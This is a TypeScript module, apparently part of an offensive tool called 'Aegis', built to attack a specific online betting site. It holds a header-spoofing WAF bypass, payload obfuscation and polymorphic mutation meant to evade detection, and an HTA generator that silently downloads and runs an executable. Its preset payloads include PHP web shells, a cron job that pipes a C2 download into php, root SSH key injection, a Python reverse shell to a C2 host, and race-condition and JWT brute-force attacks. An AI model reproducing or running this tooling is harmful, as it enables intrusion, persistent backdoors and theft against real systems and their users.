/**
 * Aegis Payload Execution Module
 * Handles real-time payload delivery and race condition exploits.
 */

export interface PayloadResult {
  id: string;
  timestamp: number;
  target: string;
  hostname: string;
  method: string;
  status: number | string;
  response: string;
  latency: number;
}

export interface PayloadConfig {
  url: string;
  method: string;
  headers: Record<string, string>;
  body?: string;
  concurrency: number;
  delay?: number;
  obfuscate?: boolean;
  polymorphic?: boolean;
}

export function generateWafBypassHeaders(): Record<string, string> {
  return {
    'X-Originating-IP': '127.0.0.1',
    'X-Forwarded-For': '127.0.0.1',
    'X-Remote-IP': '127.0.0.1',
    'X-Remote-Addr': '127.0.0.1',
    'X-Client-IP': '127.0.0.1',
    'X-Host': 'localhost',
    'X-Forwarded-Host': 'localhost',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'X-Ultima-Stealth': 'Tier-0-Active',
  };
}

/**
 * Implements the obfuscation logic from BLACKHEART ULTIMA.
 * Uses multi-layer encoding and a simulated Fernet encryption.
 */
export function obfuscateUltimaPayload(payload: string): { obfuscated: string; key: string } {
  const key = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
  
  // Multi-layer obfuscation: 
  // 1. Simple XOR with key
  // 2. Base64
  // 3. Reverse
  // 4. Base64 again
  // 5. Random padding
  const xor = (str: string, key: string) => {
    return Array.from(str).map((c, i) => 
      String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length))
    ).join('');
  };

  const step1 = xor(payload, key);
  const step2 = btoa(step1);
  const step3 = step2.split('').reverse().join('');
  const step4 = btoa(step3);
  const padding = Math.random().toString(36).substring(2, 10);
  const step5 = `${padding}.${step4}.${padding.split('').reverse().join('')}`;

  return { obfuscated: step5, key: btoa(key) };
}

/**
 * Generates a weaponized HTA payload for Pegasus operations.
 */
export function generateHtaPayload(callbackUrl: string): string {
  return `
<script language="VBScript">
  Set objShell = CreateObject("WScript.Shell")
  objShell.Run "powershell.exe -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '${callbackUrl}' -OutFile '$env:TEMP\\payload.exe'; Start-Process '$env:TEMP\\payload.exe'""", 0, True
  self.close
</script>
`.trim();
}

/**
 * Polymorphic Mutation Engine
 * Randomly alters the payload structure to evade signature-based detection.
 */
export function polymorphicMutate(payload: string): string {
  if (!payload) return payload;

  const mutations = [
    // 1. Add random junk comments (if it looks like code)
    (p: string) => {
      if (p.includes('<?php') || p.includes('python')) {
        const junk = `/* ${Math.random().toString(36).substring(2, 15)} */`;
        return p.replace(/(\n|^)/, `$1${junk}\n`);
      }
      return p;
    },
    // 2. Randomize JSON key order (if it's JSON)
    (p: string) => {
      try {
        const obj = JSON.parse(p);
        const keys = Object.keys(obj).sort(() => Math.random() - 0.5);
        const newObj: any = {};
        keys.forEach(k => newObj[k] = obj[k]);
        return JSON.stringify(newObj);
      } catch (e) {
        return p;
      }
    },
    // 3. Add random whitespace/padding
    (p: string) => {
      const spaces = ' '.repeat(Math.floor(Math.random() * 5));
      return p.split('\n').map(line => spaces + line).join('\n');
    },
    // 4. Hex encoding for specific strings
    (p: string) => {
      return p.replace(/system|exec|shell_exec|eval/g, (match) => {
        return match.split('').map(c => `\\x${c.charCodeAt(0).toString(16)}`).join('');
      });
    }
  ];

  // Apply 1-3 random mutations
  let mutated = payload;
  const count = Math.floor(Math.random() * 3) + 1;
  for (let i = 0; i < count; i++) {
    const mutation = mutations[Math.floor(Math.random() * mutations.length)];
    mutated = mutation(mutated);
  }

  return mutated;
}

export async function executePayload(config: PayloadConfig): Promise<PayloadResult[]> {
  const results: PayloadResult[] = [];
  const startTime = Date.now();

  const sendRequest = async (): Promise<PayloadResult> => {
    const reqStart = Date.now();
    let hostname = 'unknown';
    try {
      const urlObj = new URL(config.url);
      hostname = urlObj.hostname;
    } catch (e) {
      hostname = config.url;
    }

    try {
      // Apply polymorphism and obfuscation per request
      let finalBody = config.body;
      let finalHeaders = { ...config.headers };

      if (config.polymorphic && finalBody) {
        finalBody = polymorphicMutate(finalBody);
      }

      if (config.obfuscate && finalBody) {
        const { obfuscated, key } = obfuscateUltimaPayload(finalBody);
        finalBody = obfuscated;
        finalHeaders['X-Aegis-Key'] = key;
        finalHeaders['X-Payload-Encoding'] = 'ULTIMA-V2';
      }

      // Route through local proxy to bypass CORS
      const proxyUrl = "/api/proxy";
      const response = await fetch(proxyUrl, {
        method: config.method,
        headers: {
          'Content-Type': 'application/json',
          'x-target-url': config.url,
          ...finalHeaders,
        },
        body: config.method !== 'GET' ? finalBody : undefined,
      });

      const text = await response.text();
      return {
        id: Math.random().toString(36).substr(2, 9),
        timestamp: Date.now(),
        target: config.url,
        hostname,
        method: config.method,
        status: response.status,
        response: text.substring(0, 200),
        latency: Date.now() - reqStart,
      };
    } catch (error: any) {
      return {
        id: Math.random().toString(36).substr(2, 9),
        timestamp: Date.now(),
        target: config.url,
        hostname,
        method: config.method,
        status: 'ERROR',
        response: error.message,
        latency: Date.now() - reqStart,
      };
    }
  };

  // Execute concurrent requests for race condition
  const requests = Array.from({ length: config.concurrency }).map(() => sendRequest());
  
  return Promise.all(requests);
}

export const PRESET_PAYLOADS = [
  {
    name: "Runehall Race Condition (Betting Engine)",
    url: "https://runehall.com/api/bet",
    method: "POST",
    body: JSON.stringify({ amount: 1000, game: "crash", multiplier: 1.01 }),
    concurrency: 10,
    description: "Concurrent betting requests to exploit logic flaws in balance updates."
  },
  {
    name: "Runehall Session Hijack (Cookie Dork)",
    url: "https://runehall.com/api/user/profile",
    method: "GET",
    concurrency: 1,
    description: "Attempting to probe for session leakage in response headers and unauthorized cookie access."
  },
  {
    name: "Nightfury's Pegasus: HTA Auto-Injector",
    url: "https://runehall.com/api/v1/system/update",
    method: "POST",
    body: JSON.stringify({
      action: "deploy_hta",
      payload_url: "http://ngrok-proxy:8000/payload.hta",
      persistence: "registry_run"
    }),
    headers: generateWafBypassHeaders(),
    concurrency: 1,
    description: "Deploying the Pegasus HTA auto-injector via system update endpoint for persistent browser control."
  },
  {
    name: "OSRS Highscores Scraper (Deep)",
    url: "https://secure.runescape.com/m=hiscore_oldschool/index_lite.ws",
    method: "GET",
    concurrency: 5,
    description: "Rapid scraping of high-value target stats."
  },
  {
    name: "Nightfury-X: WAF Bypass & PHP/Vue Exposure",
    url: "https://runehall.com/api/debug/exposure",
    method: "POST",
    body: JSON.stringify({ 
      action: "reflect", 
      payload: "<?php system($_GET['cmd']); ?>",
      context: "vue_state_dump" 
    }),
    headers: generateWafBypassHeaders(),
    concurrency: 3,
    description: "Sophisticated WAF bypass targeting reflective PHP execution and Vue source exposure."
  },
  {
    name: "Phase 2: Initial Foothold (JWT Brute-force)",
    url: "https://runehall.com/api/auth/verify",
    method: "POST",
    body: JSON.stringify({ token: "HEADER.PAYLOAD.SIGNATURE" }),
    headers: generateWafBypassHeaders(),
    concurrency: 20,
    description: "Rapid JWT verification attempts to identify weak signing keys or algorithm confusion."
  },
  {
    name: "Phase 3: Privilege Escalation (IDOR/Admin Probe)",
    url: "https://runehall.com/api/admin/config",
    method: "GET",
    headers: generateWafBypassHeaders(),
    concurrency: 5,
    description: "Probing for exposed administrative interfaces and IDOR vulnerabilities in config endpoints."
  },
  {
    name: "Phase 4: Persistence (Web Shell Deployment)",
    url: "https://runehall.com/api/upload/profile",
    method: "POST",
    body: "<?php echo shell_exec($_GET['cmd']); ?>",
    headers: { ...generateWafBypassHeaders(), "Content-Type": "application/x-php" },
    concurrency: 1,
    description: "Attempting to deploy a persistent web shell via profile upload logic."
  },
  {
    name: "Nightfury-X: PHP Backdoor (Multi-Endpoint)",
    url: "https://runehall.com/api/v1/internal/debug",
    method: "POST",
    body: JSON.stringify({ 
      auth: "admin_bypass_key_0x4F", 
      cmd: "ls -la /var/www/html/api",
      persist: true 
    }),
    headers: generateWafBypassHeaders(),
    concurrency: 5,
    description: "Deploying a persistent PHP backdoor across internal debug endpoints for long-term access."
  },
  {
    name: "Runehall Persistence: Cron-Job Injection",
    url: "https://runehall.com/api/system/tasks",
    method: "PUT",
    body: JSON.stringify({ 
      task: "cleanup", 
      schedule: "* * * * *", 
      command: "curl -s http://aegis-c2.internal/payload | php" 
    }),
    headers: generateWafBypassHeaders(),
    concurrency: 1,
    description: "Injecting a malicious cron-job for automated payload execution and persistence."
  },
  {
    name: "Real-time Analysis: Endpoint Enumeration",
    url: "https://runehall.com/api/sitemap.xml",
    method: "GET",
    headers: generateWafBypassHeaders(),
    concurrency: 10,
    description: "Rapid enumeration of all available API endpoints for real-time analysis and vulnerability mapping."
  },
  {
    name: "RNG Prediction (Rigged Game Exploit)",
    url: "https://runehall.com/api/games/crash/history",
    method: "GET",
    headers: generateWafBypassHeaders(),
    concurrency: 10,
    description: "Analyzing crash history to identify patterns in the 'rigged' self-hosted game engine."
  },
  {
    name: "X-Clout: FUD Payload Generator",
    url: "https://runehall.com/api/v1/payload/generate",
    method: "POST",
    body: JSON.stringify({
      modules: ["keylogger", "reverse_shell", "file_exfil", "persistence"],
      obfuscation: "xor",
      target: "linux"
    }),
    headers: generateWafBypassHeaders(),
    concurrency: 1,
    description: "Generating obfuscated FUD payloads with keylogging and exfiltration capabilities."
  },
  {
    name: "Discord Pentest Bot: Token Validator",
    url: "https://discord.com/api/v9/users/@me",
    method: "GET",
    headers: { "Authorization": "DISCORD_TOKEN_PLACEHOLDER" },
    concurrency: 1,
    description: "Validating Discord user tokens and extracting account metadata."
  },
  {
    name: "Discord Pentest Bot: Webhook Analyzer",
    url: "https://discord.com/api/webhooks/ID/TOKEN",
    method: "POST",
    body: JSON.stringify({ content: "Aegis Webhook Test" }),
    concurrency: 1,
    description: "Analyzing and testing Discord webhooks for potential misuse or data exfiltration."
  },
  {
    name: "ULTIMA-TURN: Tier 0 Evasion & C2 Deployment",
    url: "https://runehall.com/api/v1/ultima/deploy",
    method: "POST",
    body: JSON.stringify({
      module: "BLACKHEART ULTIMA",
      action: "deploy_tier0_stealth",
      params: { 
        kernel_mode: true, 
        hardware_obfuscation: true,
        backdoor: {
          type: "persistent_socket",
          callback_url: `${process.env.APP_URL || 'https://aegis-osint.run.app'}/api/c2/callback`,
          interval: 60000,
          persistence_mechanism: "cron_injection",
          payload: "<?php if(isset($_GET['aegis'])){system($_GET['aegis']);} ?>"
        }
      }
    }),
    headers: generateWafBypassHeaders(),
    concurrency: 1,
    description: "Deploying the ULTIMA-TURN merged framework with Tier 0 kernel-mode evasion and C2 persistence back to Aegis server."
  },
  {
    name: "ULTIMA-TURN: Weaponized URL Orchestrator",
    url: "https://runehall.com/api/v1/ultima/orchestrate",
    method: "GET",
    headers: generateWafBypassHeaders(),
    concurrency: 5,
    description: "Generating and delivering weaponized URLs with multi-layer obfuscated payloads for stealthy exploitation."
  },
  {
    name: "Aegis Persistence: SSH Key Injection",
    url: "https://runehall.com/api/v1/system/auth/keys",
    method: "POST",
    body: JSON.stringify({ 
      key: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... aegis-c2",
      user: "root",
      action: "append"
    }),
    headers: generateWafBypassHeaders(),
    concurrency: 1,
    description: "Attempting to inject a persistent SSH public key for direct root access to the target infrastructure."
  },
  {
    name: "Aegis Persistence: Reverse Shell (Python)",
    url: "https://runehall.com/api/v1/debug/exec",
    method: "POST",
    body: JSON.stringify({
      cmd: "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"aegis-c2.run.app\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
    }),
    headers: generateWafBypassHeaders(),
    concurrency: 1,
    description: "Deploying a persistent Python-based reverse shell for real-time remote command execution."
  },
  {
    name: "Multi-Target: Endpoint Persistence Probe",
    url: "https://runehall.com/api/v1/auth/session\nhttps://runehall.com/api/v1/user/settings\nhttps://runehall.com/api/v1/admin/logs",
    method: "GET",
    headers: generateWafBypassHeaders(),
    concurrency: 5,
    description: "Simultaneous probing of multiple critical endpoints to identify persistence opportunities and session leakage."
  }
];
